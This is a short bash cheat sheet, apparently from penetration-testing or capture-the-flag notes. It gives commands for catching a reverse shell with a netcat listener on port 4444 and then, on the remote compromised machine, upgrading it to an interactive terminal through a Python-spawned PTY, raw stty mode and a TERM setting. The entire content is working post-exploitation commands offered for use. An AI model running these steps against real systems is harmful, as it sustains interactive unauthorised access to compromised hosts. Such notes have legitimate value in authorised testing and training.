```bash
# Host.
rlwrap nc -lvnp 4444

# Remote.
dpkg -l | grep python
python -c "import pty;pty.spawn('/bin/bash')"
stty raw -echo
export TERM=xterm-color
```